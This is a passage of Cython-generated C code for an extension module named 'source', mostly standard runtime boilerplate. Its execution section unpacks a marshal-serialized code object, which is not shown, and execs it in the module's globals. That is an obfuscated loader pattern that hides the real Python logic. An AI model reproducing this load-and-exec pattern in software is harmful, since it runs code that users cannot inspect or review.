PY_MAJOR_VERSION < 3\n__Pyx_PyMODINIT_FUNC initsource(void) CYTHON_SMALL_CODE; /*proto*/\n__Pyx_PyMODINIT_FUNC initsource(void)\n#else\n__Pyx_PyMODINIT_FUNC PyInit_source(void) CYTHON_SMALL_CODE; /*proto*/\n__Pyx_PyMODINIT_FUNC PyInit_source(void)\n#if CYTHON_PEP489_MULTI_PHASE_INIT\n{\n  return PyModuleDef_Init(&__pyx_moduledef);\n}\nstatic CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {\n    #if PY_VERSION_HEX >= 0x030700A1\n    static PY_INT64_T main_interpreter_id = -1;\n    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);\n    if (main_interpreter_id == -1) {\n        main_interpreter_id = current_id;\n        return (unlikely(""current_id == -1)) ? -1 : 0;\n    } else if (unlikely(main_interpreter_id != current_id))\n    #else\n    static PyInterpreterState *main_interpreter = NULL;\n    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;\n    if (!main_interpreter) {\n        main_interpreter = current_interpreter;\n    } else if (unlikely(main_interpreter != current_interpreter))\n    #endif\n    {\n        PyErr_SetString(\n            PyExc_ImportError,\n            \"Interpreter change detected - this module can only be loaded into one interpreter per process.\");\n        return -1;\n    }\n    return 0;\n}\nstatic CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {\n    PyObject *value = PyObject_GetAttrString(spec, from_name);\n    int result = 0;\n    if (likely(value)) {\n        if (allow_none || value != Py_None) {\n            result = PyDict_SetItemString(moddict, to_name, value);\n        }\n        Py_DECREF(value);\n    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {\n        PyErr_Clear();\n    } else {\n        result = -1;\n    }\n    return result;\n}\nstatic CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {\n    PyObject *module = NULL, *moddict, *modname;\n    if (__Pyx_check_single_interpreter())\n        return NULL;\n    if (__pyx_m)\n        return __Pyx_NewRef(__pyx_m);\n    modname = PyObject_GetAttrString(spec, \"name\");\n    if (unlikely(!modname)) goto bad;\n    module = PyModule_NewObject(modname);\n    Py_DECREF(modname);\n    if (unlikely(!module)) goto bad;\n    moddict = PyModule_GetDict(module);\n    if (unlikely(!moddict)) goto bad;\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, \"loader\", \"__loader__\", 1) < 0)) goto bad;\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, \"origin\", \"__file__\", 1) < 0)) goto bad;\n    if (unlikely(__Pyx_copy_spec_to_module(s""pec, moddict, \"parent\", \"__package__\", 1) < 0)) goto bad;\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, \"submodule_search_locations\", \"__path__\", 0) < 0)) goto bad;\n    return module;\nbad:\n    Py_XDECREF(module);\n    return NULL;\n}\n\n\nstatic CYTHON_SMALL_CODE int __pyx_pymod_exec_source(PyObject *__pyx_pyinit_module)\n#endif\n#endif\n{\n  PyObject *__pyx_t_1 = NULL;\n  PyObject *__pyx_t_2 = NULL;\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  __Pyx_RefNannyDeclarations\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\n  if (__pyx_m) {\n    if (__pyx_m == __pyx_pyinit_module) return 0;\n    PyErr_SetString(PyExc_RuntimeError, \"Module 'source' has already been imported. Re-initialisation is not supported.\");\n    return -1;\n  }\n  #elif PY_MAJOR_VERSION >= 3\n  if (__pyx_m) return __Pyx_NewRef(__pyx_m);\n  #endif\n  #if CYTHON_REFNANNY\n__Pyx_RefNanny = __Pyx_RefNannyImportAPI(\"refnanny\");\nif (!__Pyx_RefNanny) {\n  PyErr_Clear();\n  __Pyx_RefNanny = __Pyx_RefNannyImportAPI(\"Cython.Runtime.refnanny\");\n  if (!__Pyx_RefNanny)\n      Py_FatalError(\"failed to import 'refnanny' module\");\n}\n#endif\n  __Pyx_RefNannySetupContext(\"__Pyx_PyMODINIT_FUNC PyInit_source(void)\", 0);\n  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\n  #ifdef __Pxy_PyFrame_Initialize_Offsets\n  __Pxy_PyFrame_Initialize_Offsets();\n  #endif\n  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 4, __pyx_L1_error)\n  __pyx_empty_bytes = PyBytes_FromStringAndSize(\"\", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 4, __pyx_L1_error)\n  __pyx_empty_unicode = PyUnicode_FromStringAndSize(\"\", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 4, __pyx_L1_error)\n  #ifdef __Pyx_CyFunction_USED\n  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_FusedFunction_USED\n  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_erro""r)\n  #endif\n  #ifdef __Pyx_Coroutine_USED\n  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_Generator_USED\n  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_AsyncGen_USED\n  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_StopAsyncIteration_USED\n  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\n  #endif\n  /*--- Library function declarations ---*/\n  /*--- Threads initialization code ---*/\n  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS\n  PyEval_InitThreads();\n  #endif\n  /*--- Module creation code ---*/\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\n  __pyx_m = __pyx_pyinit_module;\n  Py_INCREF(__pyx_m);\n  #else\n  #if PY_MAJOR_VERSION < 3\n  __pyx_m = Py_InitModule4(\"source\", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);\n  #else\n  __pyx_m = PyModule_Create(&__pyx_moduledef);\n  #endif\n  if (unlikely(!__pyx_m)) __PYX_ERR(0, 4, __pyx_L1_error)\n  #endif\n  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 4, __pyx_L1_error)\n  Py_INCREF(__pyx_d);\n  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 4, __pyx_L1_error)\n  Py_INCREF(__pyx_b);\n  __pyx_cython_runtime = PyImport_AddModule((char *) \"cython_runtime\"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 4, __pyx_L1_error)\n  Py_INCREF(__pyx_cython_runtime);\n  if (PyObject_SetAttrString(__pyx_m, \"__builtins__\", __pyx_b) < 0) __PYX_ERR(0, 4, __pyx_L1_error)\n  /*--- Initialize various global constants etc. ---*/\n  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\n  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)\n  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\n  #endif\n  if (__py""x_module_is_main_source) {\n    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name, __pyx_n_s_main) < 0) __PYX_ERR(0, 4, __pyx_L1_error)\n  }\n  #if PY_MAJOR_VERSION >= 3\n  {\n    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 4, __pyx_L1_error)\n    if (!PyDict_GetItemString(modules, \"source\")) {\n      if (unlikely(PyDict_SetItemString(modules, \"source\", __pyx_m) < 0)) __PYX_ERR(0, 4, __pyx_L1_error)\n    }\n  }\n  #endif\n  /*--- Builtin init code ---*/\n  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\n  /*--- Constants init code ---*/\n  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\n  /*--- Global type/function init code ---*/\n  (void)__Pyx_modinit_global_init_code();\n  (void)__Pyx_modinit_variable_export_code();\n  (void)__Pyx_modinit_function_export_code();\n  (void)__Pyx_modinit_type_init_code();\n  (void)__Pyx_modinit_type_import_code();\n  (void)__Pyx_modinit_variable_import_code();\n  (void)__Pyx_modinit_function_import_code();\n  /*--- Execution code ---*/\n  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)\n  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 4, __pyx_L1_error)\n  #endif\n\n  \n  __pyx_t_1 = __Pyx_Import(__pyx_n_s_marshal, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_marshal, __pyx_t_1) < 0) __PYX_ERR(0, 6, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n\n  \n  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_marshal); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 7, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_loads); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 7, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple_, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 7, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);""\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __pyx_t_2 = __Pyx_PyExecGlobals(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 7, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n  \n  __pyx_t_2 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_2) < 0) __PYX_ERR(0, 4, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n  /*--- Wrapped vars code ---*/\n\n  goto __pyx_L0;\n  __pyx_L1_error:;\n  __Pyx_XDECREF(__pyx_t_1);\n  __Pyx_XDECREF(__pyx_t_2);\n  if (__pyx_m) {\n    if (__pyx_d) {\n      __Pyx_AddTraceback(\"init source\", __pyx_clineno, __pyx_lineno, __pyx_filename);\n    }\n    Py_CLEAR(__pyx_m);\n  } else if (!PyErr_Occurred()) {\n    PyErr_SetString(PyExc_ImportError, \"init source\");\n  }\n  __pyx_L0:;\n  __Pyx_RefNannyFinishContext();\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\n  return (__pyx_m != NULL) ? 0 : -1;\n  #elif PY_MAJOR_VERSION >= 3\n  return __pyx_m;\n  #else\n  return;\n  #endif\n}\n\n/* --- Runtime support code --- */\n/* Refnanny */\n#if CYTHON_REFNANNY\nstatic __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {\n    PyObject *m = NULL, *p = NULL;\n    void *r = NULL;\n    m = PyImport_ImportModule(modname);\n    if (!m) goto end;\n    p = PyObject_GetAttrString(m, \"RefNannyAPI\");\n    if (!p) goto end;\n    r = PyLong_AsVoidPtr(p);\nend:\n    Py_XDECREF(p);\n    Py_XDECREF(m);\n    return (__Pyx_RefNannyAPIStruct *)r;\n}\n#endif\n\n/* PyObjectGetAttrStr */\n#if CYTHON_USE_TYPE_SLOTS\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {\n    PyTypeObject* tp = Py_TYPE(obj);\n    if (likely(tp->tp_getattro))\n        return tp->tp_getattro(obj, attr_name);\n#if PY_MAJOR_VERSION < 3\n    if (likely(tp->tp_getattr))\n        return tp->tp_getattr(obj, PyString_AS_STRING(""attr_name));\n#endif\n    return PyObject_GetAttr(obj, attr_name);\n}\n#endif\n\n/* Import */\nstatic PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {\n    PyObject *empty_list = 0;\n    PyObject *module = 0;\n    PyObject *global_dict = 0;\n    PyObject *empty_dict = 0;\n    PyObject *list;\n    #if PY_MAJOR_VERSION < 3\n    PyObject *py_import;\n    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);\n    if (!py_import)\n        goto bad;\n    #endif\n    if (from_list)\n        list = from_list;\n    else {\n        empty_list = PyList_New(0);\n        if (!empty_list)\n            goto bad;\n        list = empty_list;\n    }\n    global_dict = PyModule_GetDict(__pyx_m);\n    if (!global_dict)\n        goto bad;\n    empty_dict = PyDict_New();\n    if (!empty_dict)\n        goto bad;\n    {\n        #if PY_MAJOR_VERSION >= 3\n        if (level == -1) {\n            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {\n                module = PyImport_ImportModuleLevelObject(\n                    name, global_dict, empty_dict, list, 1);\n                if (!module) {\n                    if (!PyErr_ExceptionMatches(PyExc_ImportError))\n                        goto bad;\n                    PyErr_Clear();\n                }\n            }\n            level = 0;\n        }\n        #endif\n        if (!module) {\n            #if PY_MAJOR_VERSION < 3\n            PyObject *py_level = PyInt_FromLong(level);\n            if (!py_level)\n                goto bad;\n            module = PyObject_CallFunctionObjArgs(py_import,\n                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);\n            Py_DECREF(py_level);\n            #else\n            module = PyImport_ImportModuleLevelObject(\n                name, global_dict, empty_dict, list, level);\n            #endif\n        }\n    }\nbad:\n    #if PY_MAJOR_VERSION < 3\n    Py_XDECREF(py_import);\n    #endif\n    Py_XDECREF(empty_list);\n    Py_XDECREF(empty""_dict);\n    return module;\n}\n\n/* GetAttr */\nstatic CYTHON_INLINE PyObject *__Pyx_GetAttr(PyObject *o, PyObject *n) {\n#if CYTHON_USE_TYPE_SLOTS\n#if PY_MAJOR_VERSION >= 3\n    if (likely(PyUnicode_Check(n)))\n#else\n    if (likely(PyString_Check(n)))\n#endif\n        return __Pyx_PyObject_GetAttrStr(o, n);\n#endif\n    return PyObject_GetAttr(o, n);\n}\n\n/* Globals */\nstatic PyObject* __Pyx_Globals(void) {\n    Py_ssize_t i;\n    PyObject *names;\n    PyObject *globals = __pyx_d;\n    Py_INCREF(globals);\n    names = PyObject_Dir(__pyx_m);\n    if (!names)\n        goto bad;\n    for (i = PyList_GET_SIZE(names)-1; i >= 0; i--) {\n#if CYTHON_COMPILING_IN_PYPY\n        PyObject* name = PySequence_ITEM(names, i);\n        if (!name)\n            goto bad;\n#else\n        PyObject* name = PyList_GET_ITEM(names, i);\n#endif\n        if (!PyDict_Contains(globals, name)) {\n            PyObject* value = __Pyx_GetAttr(__pyx_m, name);\n            if (!value) {\n#if CYTHON_COMPILING_IN_PYPY\n                Py_DECREF(name);\n#endif\n                goto bad;\n            }\n            if (PyDict_SetItem(globals, name, value) < 0) {\n#if CYTHON_COMPILING_IN_PYPY\n                Py_DECREF(name);\n#endif\n                Py_DECREF(value);\n                goto bad;\n            }\n        }\n#if CYTHON_COMPILING_IN_PYPY\n        Py_DECREF(name);\n#endif\n    }\n    Py_DECREF(names);\n    return globals;\nbad:\n    Py_XDECREF(names);\n    Py_XDECREF(globals);\n    return NULL;\n}\n\n/* PyExec */\nstatic CYTHON_INLINE PyObject* __Pyx_PyExec2(PyObject* o, PyObject* globals) {\n    return __Pyx_PyExec3(o, globals, NULL);\n}\nstatic PyObject* __Pyx_PyExec3(PyObject* o, PyObject* globals, PyObject* locals) {\n    PyObject* result;\n    PyObject* s = 0;\n    char *code = 0;\n    if (!globals || globals == Py_None) {\n        globals = __pyx_d;\n    } else if (!PyDict_Check(globals)) {\n        PyErr_Format(PyExc_TypeError, \"exec() arg 2 must be a dict, not %.200s\",\n       ""              Py_TYPE(globals)->tp_name);\n        goto bad;\n    }\n    if (!locals || locals == Py_None) {\n        locals = globals;\n    }\n    if (__Pyx_PyDict_GetItemStr(globals, __pyx_n_s_builtins) == NULL) {\n        if (PyDict_SetItem(globals, __pyx_n_s_builtins, PyEval_GetBuiltins()) < 0)\n            goto bad;\n    }\n    if (PyCode_Check(o)) {\n        if (__Pyx_PyCode_HasFreeVars((PyCodeObject *)o)) {\n            PyErr_SetString(PyExc_TypeError,\n                \"code object passed to exec() may not contain free variables\");\n            goto bad;\n        }\n        #if PY_VERSION_HEX < 0x030200B1 || (CYTHON_COMPILING_IN_PYPY && PYPY_VERSION_NUM < 0x07030400)\n        result = PyEval_EvalCode((PyCodeObject *)o, globals, locals);\n        #else\n        result = PyEval_EvalCode(o, globals, locals);\n        #endif\n    } else {\n        PyCompilerFlags cf;\n        cf.cf_flags = 0;\n#if PY_VERSION_HEX >= 0x030800A3\n        cf.cf_feature_version = PY_MINOR_VERSION;\n#endif\n        if (PyUnicode_Check(o)) {\n            cf.cf_flags = PyCF_SOURCE_IS_UTF8;\n            s = PyUnicode_AsUTF8String(o);\n            if (!s) goto bad;\n            o = s;\n        #if PY_MAJOR_VERSION >= 3\n        } else if (!PyBytes_Check(o)) {\n        #else\n        } else if (!PyString_Check(o)) {\n        #endif\n            PyErr_Format(PyExc_TypeError,\n                \"exec: arg 1 must be string, bytes or code object, got %.200s\",\n                Py_TYPE(o)->tp_name);\n            goto bad;\n        }\n        #if PY_MAJOR_VERSION >= 3\n        code = PyBytes_AS_STRING(o);\n        #else\n        code = PyString_AS_STRING(o);\n        #endif\n        if (PyEval_MergeCompilerFlags(&cf)) {\n            result = PyRun_StringFlags(code, Py_file_input, globals, locals, &cf);\n        } else {\n            result = PyRun_String(code, Py_file_input, globals, locals);\n        }\n        Py_XDECREF(s);\n    }\n    return result;\nbad:\n    Py_XDECREF(s);\n    return 0;""\n}\n\n/* PyExecGlobals */\nstatic PyObject* __Pyx_PyExecGlobals(PyObject* code) {\n    PyObject* result;\n    PyObject* globals = __Pyx_Globals();\n    if (unlikely(!globals))\n        return NULL;\n    result = __Pyx_PyExec2(code, globals);\n    Py_DECREF(globals);\n    return result;\n}\n\n/* GetBuiltinName */\nstatic PyObject *__Pyx_GetBuiltinName(PyObject *name) {\n    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);\n    if (unlikely(!result)) {\n        PyErr_Format(PyExc_NameError,\n#if PY_MAJOR_VERSION >= 3\n            \"name '%U' is not defined\", name);\n#else\n            \"name '%.200s' is not defined\", PyString_AS_STRING(name));\n#endif\n    }\n    return result;\n}\n\n/* PyDictVersioning */\n#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {\n    PyObject *dict = Py_TYPE(obj)->tp_dict;\n    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;\n}\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {\n    PyObject **dictptr = NULL;\n    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;\n    if (offset) {\n#if CYTHON_COMPILING_IN_CPYTHON\n        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);\n#else\n        dictptr = _PyObject_GetDictPtr(obj);\n#endif\n    }\n    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;\n}\nstatic CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {\n    PyObject *dict = Py_TYPE(obj)->tp_dict;\n    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))\n        return 0;\n    return obj_dict_version == __Pyx_get_object_dict_version(obj);\n}\n#endif\n\n/* GetModuleGlobalName */\n#if CYTHON_USE_DICT_VERSIONS\nstatic PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)\n#else\nstatic ""CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)\n#endif\n{\n    PyObject *result;\n#if !CYTHON_AVOID_BORROWED_REFS\n#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1\n    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);\n    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)\n    if (likely(result)) {\n        return __Pyx_NewRef(result);\n    } else if (unlikely(PyErr_Occurred())) {\n        return NULL;\n    }\n#else\n    result = PyDict_GetItem(__pyx_d, name);\n    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)\n    if (likely(result)) {\n        return __Pyx_NewRef(result);\n    }\n#endif\n#else\n    result = PyObject_GetItem(__pyx_d, name);\n    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)\n    if (likely(result)) {\n        return __Pyx_NewRef(result);\n    }\n    PyErr_Clear();\n#endif\n    return __Pyx_GetBuiltinName(name);\n}\n\n/* PyObjectCall */\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {\n    PyObject *result;\n    ternaryfunc call = Py_TYPE(func)->tp_call;\n    if (unlikely(!call))\n        return PyObject_Call(func, arg, kw);\n    if (unlikely(Py_EnterRecursiveCall((char*)\" while calling a Python object\")))\n        return NULL;\n    result = (*call)(func, arg, kw);\n    Py_LeaveRecursiveCall();\n    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {\n        PyErr_SetString(\n            PyExc_SystemError,\n            \"NULL result without error in PyObject_Call\");\n    }\n    return result;\n}\n#endif\n\n/* PyErrFetchRestore */\n#if CYTHON_FAST_THREAD_STATE\nstatic CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {\n    PyObject *tmp_type, *tmp_value, *tmp_tb;\n    tmp_type = tstate->curexc_type;\n    tmp_value = tstate->curexc_value;\n    tmp""_tb = tstate->curexc_traceback;\n    tstate->curexc_type = type;\n    tstate->curexc_value = value;\n    tstate->curexc_traceback = tb;\n    Py_XDECREF(tmp_type);\n    Py_XDECREF(tmp_value);\n    Py_XDECREF(tmp_tb);\n}\nstatic CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {\n    *type = tstate->curexc_type;\n    *value = tstate->curexc_value;\n    *tb = tstate->curexc_traceback;\n    tstate->curexc_type = 0;\n    tstate->curexc_value = 0;\n    tstate->curexc_traceback = 0;\n}\n#endif\n\n/* CLineInTraceback */\n#ifndef CYTHON_CLINE_IN_TRACEBACK\nstatic int __Pyx_CLineForTraceback(CYTHON_UNUSED PyThreadState *tstate, int c_line) {\n    PyObject *use_cline;\n    PyObject *ptype, *pvalue, *ptraceback;\n#if CYTHON_COMPILING_IN_CPYTHON\n    PyObject **cython_runtime_dict;\n#endif\n    if (unlikely(!__pyx_cython_runtime)) {\n        return c_line;\n    }\n    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);\n#if CYTHON_COMPILING_IN_CPYTHON\n    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);\n    if (likely(cython_runtime_dict)) {\n        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(\n            use_cline, *cython_runtime_dict,\n            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))\n    } else\n#endif\n    {\n      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);\n      if (use_cline_obj) {\n        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;\n        Py_DECREF(use_cline_obj);\n      } else {\n        PyErr_Clear();\n        use_cline = NULL;\n      }\n    }\n    if (!use_cline) {\n        c_line = 0;\n        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);\n    }\n    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {\n        c_line = 0;\n    }\n    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptr""aceback);\n    return c_line;\n}\n#endif\n\n/* CodeObjectCache */\nstatic int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {\n    int start = 0, mid = 0, end = count - 1;\n    if (end >= 0 && code_line > entries[end].code_line) {\n        return count;\n    }\n    while (start < end) {\n        mid = start + (end - start) / 2;\n        if (code_line < entries[mid].code_line) {\n            end = mid;\n        } else if (code_line > entries[mid].code_line) {\n             start = mid + 1;\n        } else {\n            return mid;\n        }\n    }\n    if (code_line <= entries[mid].code_line) {\n        return mid;\n    } else {\n        return mid + 1;\n    }\n}\nstatic PyCodeObject *__pyx_find_code_object(int code_line) {\n    PyCodeObject* code_object;\n    int pos;\n    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {\n        return NULL;\n    }\n    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);\n    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {\n        return NULL;\n    }\n    code_object = __pyx_code_cache.entries[pos].code_object;\n    Py_INCREF(code_object);\n    return code_object;\n}\nstatic void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {\n    int pos, i;\n    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;\n    if (unlikely(!code_line)) {\n        return;\n    }\n    if (unlikely(!entries)) {\n        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));\n        if (likely(entries)) {\n            __pyx_code_cache.entries = entries;\n            __pyx_code_cache.max_count = 64;\n            __pyx_code_cache.count = 1;\n            entries[0].code_line = code_line;\n            entries[0].code_object = code_object;\n            Py_INCREF(code_object);\n        }\n        return;\n    }\n    pos = __py""x_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);\n    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {\n        PyCodeObject* tmp = entries[pos].code_object;\n        entries[pos].code_object = code_object;\n        Py_DECREF(tmp);\n        return;\n    }\n    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {\n        int new_max = __pyx_code_cache.max_count + 64;\n        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(\n            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));\n        if (unlikely(!entries)) {\n            return;\n        }\n        __pyx_code_cache.entries = entries;\n        __pyx_code_cache.max_count = new_max;\n    }\n    for (i=__pyx_code_cache.count; i>pos; i--) {\n        entries[i] = entries[i-1];\n    }\n    entries[pos].code_line = code_line;\n    entries[pos].code_object = code_object;\n    __pyx_code_cache.count++;\n    Py_INCREF(code_object);\n}\n\n/* AddTraceback */\n#include \"compile.h\"\n#include \"frameobject.h\"\n#include \"traceback.h\"\n#if PY_VERSION_HEX >= 0x030b00a6\n  #ifndef Py_BUILD_CORE\n    #define Py_BUILD_CORE 1\n  #endif\n  #include \"internal/pycore_frame.h\"\n#endif\nstatic PyCodeObject* __Pyx_CreateCodeObjectForTraceback(\n            const char *funcname, int c_line,\n            int py_line, const char *filename) {\n    PyCodeObject *py_code = NULL;\n    PyObject *py_funcname = NULL;\n    #if PY_MAJOR_VERSION < 3\n    PyObject *py_srcfile = NULL;\n    py_srcfile = PyString_FromString(filename);\n    if (!py_srcfile) goto bad;\n    #endif\n    if (c_line) {\n        #if PY_MAJOR_VERSION < 3\n        py_funcname = PyString_FromFormat( \"%s (%s:%d)\", funcname, __pyx_cfilenm, c_line);\n        if (!py_funcname) goto bad;\n        #else\n        py_funcname = PyUnicode_FromFormat( \"%s (%s:%d)\", funcname, __pyx_cfilenm, c_line);\n        if (!py_funcname) goto bad;\n      ""  funcname = PyUnicode_AsUTF8(py_funcname);\n        if (!funcname) goto bad;\n        #endif\n    }\n    else {\n        #if PY_MAJOR_VERSION < 3\n        py_funcname = PyString_FromString(funcname);\n        if (!py_funcname) goto bad;\n        #endif\n    }\n    #if PY_MAJOR_VERSION < 3\n    py_code = __Pyx_PyCode_New(\n        0,\n        0,\n        0,\n        0,\n        0,\n        __pyx_empty_bytes, /*PyObject *code,*/\n        __pyx_empty_tuple, /*PyObject *consts,*/\n        __pyx_empty_tuple, /*PyObject *names,*/\n        __pyx_empty_tuple, /*PyObject *varnames,*/\n        __pyx_empty_tuple, /*PyObject *freevars,*/\n        __pyx_empty_tuple, /*PyObject *cellvars,*/\n        